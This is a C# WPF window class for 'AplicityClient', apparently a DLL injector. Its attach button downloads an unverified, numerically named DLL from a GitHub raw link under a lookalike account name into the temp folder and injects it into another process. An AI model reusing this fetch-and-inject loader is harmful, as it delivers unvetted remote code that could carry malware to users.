﻿using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using Microsoft.Win32;
using Path = System.IO.Path;

namespace AplicityClient
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        private string _status;
        private bool _done = true;
        private int _ticks;

        private ConnectionState _connectionState;
        private readonly ConsoleWindow console = new ConsoleWindow();

        public MainWindow()
        {
            /* Update cleanup */
            var oldPath = Path.ChangeExtension(Assembly.GetExecutingAssembly().Location, "old");
            if (File.Exists(oldPath)) File.Delete(oldPath);

            InitializeComponent();
            VersionLabel.Content = $"v{GetVersion().Major}.{GetVersion().Minor}.{GetVersion().Build}";
            SetConnectionState(ConnectionState.None);

            Task.Run(() =>
            {
                while (true)
                {
                    if (!_done)
                    {
                        if (++_ticks > 12)
                            _ticks = 0;

                        string load = _status + ".";
                        if (_ticks > 4) load += ".";
                        if (_ticks > 8) load += ".";

                        Application.Current.Dispatcher.Invoke(DispatcherPriority.Render, new Action(() => AttachButton.Content = load));
                    }
                    Thread.Sleep(100);
                }
            });

            if (!CheckConnection())
            {
                MessageBox.Show("Couldn't connect to download server. You can still inject a custom DLL.");
            }
            else
            {
                CheckForUpdate();
            }
        }

        private void SetStatus(string status)
        {
            if (status == "done")
            {
                _done = true;
                _status = string.Empty;
                _ticks = 0;
                Application.Current.Dispatcher.Invoke(DispatcherPriority.Render, new Action(() => AttachButton.Content = "attach"));
            }
            else
            {
                _done = false;
                _status = status;
            }
            Console.WriteLine("[Status] " + status);
        }

        enum ConnectionState { None, Connected, Disconnected }
        private void SetConnectionState(ConnectionState state)
        {
            _connectionState = state;
            switch (state)
            {
                case ConnectionState.None:
                    ConnectionStateLabel.Content = "Not connected";
                    ConnectionStateLabel.Foreground = System.Windows.Media.Brushes.White;
                    break;
                case ConnectionState.Connected:
                    ConnectionStateLabel.Content = "Connected";
                    ConnectionStateLabel.Foreground = System.Windows.Media.Brushes.ForestGreen;
                    break;
                case ConnectionState.Disconnected:
                    ConnectionStateLabel.Content = "Disconnected";
                    ConnectionStateLabel.Foreground = System.Windows.Media.Brushes.Coral;
                    break;
            }
        }

        private void AttachButton_Left(object sender, RoutedEventArgs e)
        {
            if (!_done) return;

            SetStatus("checking connection");
            if (!CheckConnection())
            {
                if (MessageBox.Show("Can't reach download server. Try anyways?", null, MessageBoxButton.YesNo) == MessageBoxResult.No)
                {
                    SetStatus("done");
                    return;
                }
            }

            SetStatus("injecting dll..");
            var wc = new WebClient();
            var file = Path.Combine(Path.GetTempPath(), "204621564332.dll");
            wc.DownloadFileCompleted += (_, __) => Inject(file);
            wc.DownloadFileAsync(new Uri("https://github.com/PeanutnoodIez/ggggg/blob/main/204621564332.dll?raw=true"), file);
        }

        private void AttachButton_Right(object sender, MouseButtonEventArgs e)
        {
            if (!_done) return;
            
            SetStatus("selecting DLL");
            var diag = new OpenFileDialog
            {
                Filter = "dll files (*.dll)|*.dll",
                RestoreDirectory = true
            };

            if (diag.ShowDialog().GetValueOrDefault())
                Inject(diag.FileName);
            else
                SetStatus("Finished");
        }

        private void ConsoleButton_Click(object sender, MouseButtonEventArgs e)
        {
            if (console.IsVisible)
                console.Close();
            else
                console.Show();
        }

        private bool CheckConnection()
        {
            try
            {
                var request = (HttpWebRequest) WebRequest.Create("https://blank.org");
                request.KeepAlive = false;
                request.Timeout = 1000;
                using (request.GetResponse()) return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private Version GetVersion() => Assembly.GetExecutingAssembly().GetName().Version;

        private void CloseWindow(object sender, MouseButtonEventArgs e) => Application.Current.Shutdown();
        private void CreditsWindow(object sender, MouseButtonEventArgs e) => MessageBox.Show("Developers: RamXzi, PzX");
        private void DevCord(object sender, MouseButtonEventArgs e) => MessageBox.Show("Contact PzX#0167 on discord");
        private void DragWindow(object sender, MouseButtonEventArgs e) => DragMove();
    }
}
